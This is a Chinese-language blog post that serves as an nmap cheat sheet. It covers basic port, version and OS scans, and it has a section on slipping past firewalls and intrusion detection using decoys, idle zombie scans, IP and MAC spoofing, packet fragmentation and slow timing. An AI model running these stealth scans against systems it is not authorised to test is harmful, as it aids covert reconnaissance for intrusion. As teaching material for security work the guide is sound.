              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-02T21:07:34+08:00">
                2019-03-02
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/hack/" itemprop="url" rel="index">
                    <span itemprop="name">hack</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/hack/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol>
<li><a href="#orgb455342">主要功能</a></li>
<li><a href="#org22132ce">基本扫描策略</a><ol>
<li><a href="#orgc245698">无任何附加参数 nmap IP地址</a></li>
<li><a href="#orgff8f736">冗余 nmap -vv IP地址</a></li>
<li><a href="#orga918fe8">指定端口号 nmap -p端口号 IP地址</a></li>
<li><a href="#org4ecd0f3">操作系统侦测 nmap -O IP地址/nmap -A IP地址</a></li>
<li><a href="#orgf2855d8">只进行主机发现 nmap -sn IP地址</a></li>
<li><a href="#org208a493">跳过主机发现 nmap -Pn IP地址</a></li>
<li><a href="#org07fc43a">扫描和版本号侦测 nmap -sV IP地址</a></li>
<li><a href="#org621bf25">UDP 扫描 nmap -sU IP地址</a></li>
</ol>
</li>
<li><a href="#org7a7945d">绕过防火墙</a><ol>
<li><a href="#org993c109">利用掩体 namp -D IP地址1,IP地址2&#x2026; IP地址</a></li>
<li><a href="#org0621821">禁用 ping nmap -P0 IP地址</a></li>
<li><a href="#org896d6f9">IP 地址伪装 sudo proxychains nmap</a></li>
<li><a href="#orgaedc2f9">空闲扫描 nmap -sI 僵尸IP地址[:开放的僵尸端口] IP地址</a></li>
<li><a href="#orgcfc1778">指定网卡进行扫描 nmap -e 网卡 IP地址</a></li>
<li><a href="#org53242cf">限制扫描时间 nmap host-timeout 时间 IP地址</a></li>
<li><a href="#org01a3a64">指定源 IP 地址 nmap -S 源IP地址 IP地址</a></li>
<li><a href="#org270f219">定源主机端口 nmap -g 53 IP地址</a></li>
<li><a href="#orgf9d5f76">数据包分片技术 nmap -f IP地址/nmap mtu mtu单元大小 IP地址</a></li>
<li><a href="#org7e9c2c4">添加垃圾数据 nmap data-length 垃圾数据长度 IP地址</a></li>
<li><a href="#org0e7c37d">随机选择扫描对象 nmap randomize-hosts IP地址</a></li>
<li><a href="#org9860153">伪装 MAC 地址 nmap spoof-mac 伪造MAC IP地址</a></li>
<li><a href="#org849ce2e">伪造检验值 nmap badsum IP地址</a></li>
<li><a href="#orga36da18">扫描速度  nmap -T0 IP地址</a></li>
</ol>
</li>
<li><a href="#orgdd2327b">Nmap 脚本引擎</a></li>
<li><a href="#org4eeb488">常用技巧</a><ol>
<li><a href="#orge05137e">-sS 半开放扫描（非3次握手的tcp扫描）</a></li>
</ol>
</li>
</ol>
<p><a id="orgb455342"></a></p>
<h1 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h1><ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>服务版本侦测</li>
<li>操作系统侦测</li>
</ul>
<p><a id="org22132ce"></a></p>
<h1 id="基本扫描策略"><a href="#基本扫描策略" class="headerlink" title="基本扫描策略"></a>基本扫描策略</h1><p><a id="orgc245698"></a></p>
<h2 id="无任何附加参数-nmap-IP地址"><a href="#无任何附加参数-nmap-IP地址" class="headerlink" title="无任何附加参数 nmap IP地址"></a>无任何附加参数 nmap IP地址</h2><ul>
<li>如果是超级用户，无参数扫描等价于 sS 参数扫描（SYN，半连接）；否则，无参数扫描等价于 sT 参数扫描（TCP，完整连接）。</li>
</ul>
<p><a id="orgff8f736"></a></p>
<h2 id="冗余-nmap-vv-IP地址"><a href="#冗余-nmap-vv-IP地址" class="headerlink" title="冗余 nmap -vv IP地址"></a>冗余 nmap -vv IP地址</h2><p>按照基本法，v 参数通常表示冗余。我们使用两个 v 参数表示将侦测过程原原本本的打印输出出来。</p>
<p><a id="orga918fe8"></a></p>
<h2 id="指定端口号-nmap-p端口号-IP地址"><a href="#指定端口号-nmap-p端口号-IP地址" class="headerlink" title="指定端口号 nmap -p端口号 IP地址"></a>指定端口号 nmap -p端口号 IP地址</h2><p>这里 p 参数表示端口，标准写法后面跟的端口号之间没有空格。但是如果写一个空格也并无妨。</p>
<p><a id="org4ecd0f3"></a></p>
<h2 id="操作系统侦测-nmap-O-IP地址-nmap-A-IP地址"><a href="#操作系统侦测-nmap-O-IP地址-nmap-A-IP地址" class="headerlink" title="操作系统侦测 nmap -O IP地址/nmap -A IP地址"></a>操作系统侦测 nmap -O IP地址/nmap -A IP地址</h2><p>操作系统侦测有两个参数选项，其一是参数 O，其二是参数 A，后者乃前者的冗余版本。我更多的使用 A 参数，以得到更多的信息</p>
<p><a id="orgf2855d8"></a></p>
<h2 id="只进行主机发现-nmap-sn-IP地址"><a href="#只进行主机发现-nmap-sn-IP地址" class="headerlink" title="只进行主机发现 nmap -sn IP地址"></a>只进行主机发现 nmap -sn IP地址</h2><p>主机发现的手段不下几十种，但是最常用的却是 sn 参数，它表示 “使用 ping 扫描来侦测存活的主机，而不进行端口扫描”。</p>
<p><a id="org208a493"></a></p>
<h2 id="跳过主机发现-nmap-Pn-IP地址"><a href="#跳过主机发现-nmap-Pn-IP地址" class="headerlink" title="跳过主机发现 nmap -Pn IP地址"></a>跳过主机发现 nmap -Pn IP地址</h2><p>有时候对方主机开启了防火墙（这是很自然的事情），可能过滤掉了你发送的 ICMP 协议数<br>据包，这样如果想要使用 sn 参数来进行主机发现就不管用了，产生的结果也不可靠。于是<br>你不得不使用 Pn 参数，它假设所有的目标 IP 均为存活，并一个一个主机的进行端口扫描，<br>你懂的这样会牺牲一些时间作为代价。</p>
<p><a id="org07fc43a"></a></p>
<h2 id="扫描和版本号侦测-nmap-sV-IP地址"><a href="#扫描和版本号侦测-nmap-sV-IP地址" class="headerlink" title="扫描和版本号侦测 nmap -sV IP地址"></a>扫描和版本号侦测 nmap -sV IP地址</h2><p>该选项通过侦测开放的端口来判断开放的服务，并试图检测它的版本。虽然 A 选项也能做<br>到，但是要检测开放的服务版本，sV 一定是最合适的。</p>
<p><a id="org621bf25"></a></p>
<h2 id="UDP-扫描-nmap-sU-IP地址"><a href="#UDP-扫描-nmap-sU-IP地址" class="headerlink" title="UDP 扫描 nmap -sU IP地址"></a>UDP 扫描 nmap -sU IP地址</h2><p><a id="org7a7945d"></a></p>
<h1 id="绕过防火墙"><a href="#绕过防火墙" class="headerlink" title="绕过防火墙"></a>绕过防火墙</h1><p>前面讲的 Pn 选项就可以看成是 sn 选项的逃脱策略。所谓逃脱，就是不让别人发现自己，否<br>则要干的侦测工作还没搞完，就被迫中止岂不让人笑话。同样的，排名不分先后。</p>
<p><a id="org993c109"></a></p>
<h2 id="利用掩体-namp-D-IP地址1-IP地址2-x2026-IP地址"><a href="#利用掩体-namp-D-IP地址1-IP地址2-x2026-IP地址" class="headerlink" title="利用掩体 namp -D IP地址1,IP地址2&#x2026; IP地址"></a>利用掩体 namp -D IP地址1,IP地址2&#x2026; IP地址</h2><p>你可以使用 D 选项（英文 decoy）跟一些 IP 地址，IP 和 IP 之间用逗号隔开。这样看起<br>来用来侦测而发送的数据包不仅来自于你的 IP 地址，还来自于这些掩体 IP。这就叫做<br>“混入其中”。</p>
<p><a id="org0621821"></a></p>
<h2 id="禁用-ping-nmap-P0-IP地址"><a href="#禁用-ping-nmap-P0-IP地址" class="headerlink" title="禁用 ping nmap -P0 IP地址"></a>禁用 ping nmap -P0 IP地址</h2><p>在 2010 年之后，该选项和 PN 选项被一起合并到 Pn 选项之中。但是如果你愿意，你仍然可以使用 P0 选项（P 后面跟的是零）。</p>
<p><a id="org896d6f9"></a></p>
<h2 id="IP-地址伪装-sudo-proxychains-nmap"><a href="#IP-地址伪装-sudo-proxychains-nmap" class="headerlink" title="IP 地址伪装 sudo proxychains nmap"></a>IP 地址伪装 sudo proxychains nmap</h2><p>伪装 IP 地址的方法也有很多，比如你可以使用 prxychains 这款工具来实现匿名代理。</p>
<p><a id="orgaedc2f9"></a></p>
<h2 id="空闲扫描-nmap-sI-僵尸IP地址-开放的僵尸端口-IP地址"><a href="#空闲扫描-nmap-sI-僵尸IP地址-开放的僵尸端口-IP地址" class="headerlink" title="空闲扫描 nmap -sI 僵尸IP地址[:开放的僵尸端口] IP地址"></a>空闲扫描 nmap -sI 僵尸IP地址[:开放的僵尸端口] IP地址</h2><p>和 D 选线不同的是，sI 根本不使用你自己的 IP 地址，而是使用空闲的网络资源。这样隐<br>蔽性就更强了。开放的僵尸端口为选填，默认等于 80 端口。具体原理请参考 Nmap 文档。<br>根据这个理论，你不能使用空闲扫描来扫描你自己的主机 IP。在 msfconsole 中，你可以<br>使用 auxiliary/scanner/ip/ipidseq 来完成这个工作。</p>
<p><a id="orgcfc1778"></a></p>
<h2 id="指定网卡进行扫描-nmap-e-网卡-IP地址"><a href="#指定网卡进行扫描-nmap-e-网卡-IP地址" class="headerlink" title="指定网卡进行扫描 nmap -e 网卡 IP地址"></a>指定网卡进行扫描 nmap -e 网卡 IP地址</h2><p>当你拥有不止一个网卡的时候，这很有用。</p>
<p><a id="org53242cf"></a></p>
<h2 id="限制扫描时间-nmap-host-timeout-时间-IP地址"><a href="#限制扫描时间-nmap-host-timeout-时间-IP地址" class="headerlink" title="限制扫描时间 nmap host-timeout 时间 IP地址"></a>限制扫描时间 nmap host-timeout 时间 IP地址</h2><p>限制每个 IP 地址的扫描时间（单位为秒），当要扫描大量的主机 IP 时这很有用。</p>
<p><a id="org01a3a64"></a></p>
<h2 id="指定源-IP-地址-nmap-S-源IP地址-IP地址"><a href="#指定源-IP-地址-nmap-S-源IP地址-IP地址" class="headerlink" title="指定源 IP 地址 nmap -S 源IP地址 IP地址"></a>指定源 IP 地址 nmap -S 源IP地址 IP地址</h2><p>使用冒充的 IP 地址进行扫描以增强隐蔽性。这里伪装成的 IP 也可以来自于下线状态的主机地址。</p>
<p><a id="org270f219"></a></p>
<h2 id="定源主机端口-nmap-g-53-IP地址"><a href="#定源主机端口-nmap-g-53-IP地址" class="headerlink" title="定源主机端口 nmap -g 53 IP地址"></a>定源主机端口 nmap -g 53 IP地址</h2><p>使用 g 参数，或者 source-port 参数，来手动设定用来扫描的端口。常用的，如 20、53、<br>67 端口。</p>
<p><a id="orgf9d5f76"></a></p>
<h2 id="数据包分片技术-nmap-f-IP地址-nmap-mtu-mtu单元大小-IP地址"><a href="#数据包分片技术-nmap-f-IP地址-nmap-mtu-mtu单元大小-IP地址" class="headerlink" title="数据包分片技术 nmap -f IP地址/nmap mtu mtu单元大小 IP地址"></a>数据包分片技术 nmap -f IP地址/nmap mtu mtu单元大小 IP地址</h2><p>上面两种方法都可以利用数据包分片技术，某些防火墙为了加快处理速度而不会进行重组处<br>理，这样从而逃脱防火墙或闯入检测系统的检测。注意，mtu 的值必须是 8 的倍数（如 8、<br>16、24、32 等）。</p>
<p><a id="org7e9c2c4"></a></p>
<h2 id="添加垃圾数据-nmap-data-length-垃圾数据长度-IP地址"><a href="#添加垃圾数据-nmap-data-length-垃圾数据长度-IP地址" class="headerlink" title="添加垃圾数据 nmap data-length 垃圾数据长度 IP地址"></a>添加垃圾数据 nmap data-length 垃圾数据长度 IP地址</h2><p>一些常见的扫描之数据包是有特定的数据长度的，通过在发送的数据包末尾添加随机的垃圾<br>数据，以达到混淆视听的作效果。</p>
<p><a id="org0e7c37d"></a></p>
<h2 id="随机选择扫描对象-nmap-randomize-hosts-IP地址"><a href="#随机选择扫描对象-nmap-randomize-hosts-IP地址" class="headerlink" title="随机选择扫描对象 nmap randomize-hosts IP地址"></a>随机选择扫描对象 nmap randomize-hosts IP地址</h2><p>如果你要扫描大量的，比如成百上千的主机 IP，这很有效。它会打乱扫描顺序，以规避检测系统的检测。</p>
<p><a id="org9860153"></a></p>
<h2 id="伪装-MAC-地址-nmap-spoof-mac-伪造MAC-IP地址"><a href="#伪装-MAC-地址-nmap-spoof-mac-伪造MAC-IP地址" class="headerlink" title="伪装 MAC 地址 nmap spoof-mac 伪造MAC IP地址"></a>伪装 MAC 地址 nmap spoof-mac 伪造MAC IP地址</h2><p>你可以通过指定供应商的名字来伪装 MAC 地址。可选的名字有 Dell、Apple、3Com。当然<br>也可以手动指定 MAC 地址的值。或者为了简单起见，可以在上面 “伪造IP” 的地方填写数<br>字 0，这将生成一个随机的 MAC 地址。</p>
<p><a id="org849ce2e"></a></p>
<h2 id="伪造检验值-nmap-badsum-IP地址"><a href="#伪造检验值-nmap-badsum-IP地址" class="headerlink" title="伪造检验值 nmap badsum IP地址"></a>伪造检验值 nmap badsum IP地址</h2><p>这将使用伪造的 TCP / UDP / SCTP 校验和发送数据。</p>
<p><a id="orga36da18"></a></p>
<h2 id="扫描速度-nmap-T0-IP地址"><a href="#扫描速度-nmap-T0-IP地址" class="headerlink" title="扫描速度  nmap -T0 IP地址"></a>扫描速度  nmap -T0 IP地址</h2><p>T后面跟的数字代表扫描速度，数字越大则速度越快。0～5分别表示：妄想症、鬼鬼祟祟、<br>彬彬有礼、正常、好斗、精神病</p>
<p><a id="orgdd2327b"></a></p>
<h1 id="Nmap-脚本引擎"><a href="#Nmap-脚本引擎" class="headerlink" title="Nmap 脚本引擎"></a>Nmap 脚本引擎</h1><p>Nmap 脚本引擎内置在 Nmap 中，使用 script 参数进行调用。它的英文名是 Nmap Script<br>Engine，简称 NSE<br>Nmap 内置了一些已经写好的脚本，在 Kali 等主流渗透系统中被保存在<br><em>usr/share/nmap/scripts</em> 文件夹下。文件后缀名是 .nse。使用 sC（等价于<br>script=default）或者 script 参数对 Nmap 脚本进行调用</p>
<p><a id="org4eeb488"></a></p>
<h1 id="常用技巧"><a href="#常用技巧" class="headerlink" title="常用技巧"></a>常用技巧</h1><p><a id="orge05137e"></a></p>
<h2 id="sS-半开放扫描（非3次握手的tcp扫描）"><a href="#sS-半开放扫描（非3次握手的tcp扫描）" class="headerlink" title="-sS 半开放扫描（非3次握手的tcp扫描）"></a>-sS 半开放扫描（非3次握手的tcp扫描）</h2><p>使用频率最高的扫描选项：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快，效率高<br>（一个完整的tcp连接需要3次握手，而-sS选项不需要3次握手）<br>Tcp SYN Scan (sS) 它被称为半开放扫描<br>优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高<br>缺点：它需要root/administrator权限执行</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Yueyec</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Yueyec</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


  

  

</body>
</html>
